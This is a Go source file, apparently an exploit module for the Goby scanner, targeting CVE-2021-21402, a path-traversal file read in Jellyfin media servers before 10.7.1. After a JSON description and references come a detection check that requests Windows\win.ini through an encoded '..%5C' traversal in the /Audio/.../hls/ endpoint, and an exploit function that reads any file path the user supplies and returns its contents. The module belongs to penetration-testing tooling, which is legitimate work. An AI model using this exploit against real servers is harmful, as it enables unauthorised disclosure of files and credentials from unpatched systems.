package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Jellyfin Audio File read (CVE-2021-21402)",
  "Description": "Jellyfin is a Free Software Media System. In Jellyfin before version 10.7.1, with certain endpoints, well crafted requests will allow arbitrary file read from a Jellyfin server's file system. This issue is more prevalent when Windows is used as the host OS. Servers that are exposed to the public Internet are potentially at risk. This is fixed in version 10.7.1. As a workaround, users may be able to restrict some access by enforcing strict security permissions on their filesystem, however, it is recommended to update as soon as possible.",
  "Product": "Jellyfin",
  "Homepage": "https://jellyfin.org/",
  "DisclosureDate": "2021-03-23",
  "Author": "PeiQi",
  "GobyQuery": "title=\"Jellyfin\"",
  "Level": "2",
  "Impact": "File read",
  "Recommendation": "Update patches in time",
  "References": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21402",
  "RealReferences": [
    "https://github.com/jellyfin/jellyfin/commit/0183ef8e89195f420c48d2600bc0b72f6d3a7fd7",
    "https://github.com/jellyfin/jellyfin/releases/tag/v10.7.1",
    "https://github.com/jellyfin/jellyfin/security/advisories/GHSA-wg4c-c9g9-rxhx",
    "https://nvd.nist.gov/vuln/detail/CVE-2021-21402",
    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21402"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "windows/win.ini"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["File read"],
  "CVEIDs": [
    "CVE-2021-21402"
  ],
  "CVSSScore": "6.5",
  "AttackSurfaces": {
    "Application": ["Jellyfin"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Disable": false
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "extensions")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["File"].(string)
			file = strings.Replace(file, "/", "\\", -1)
			file = url.QueryEscape(file)
			uri := "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5C" + file + "/stream.mp3/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}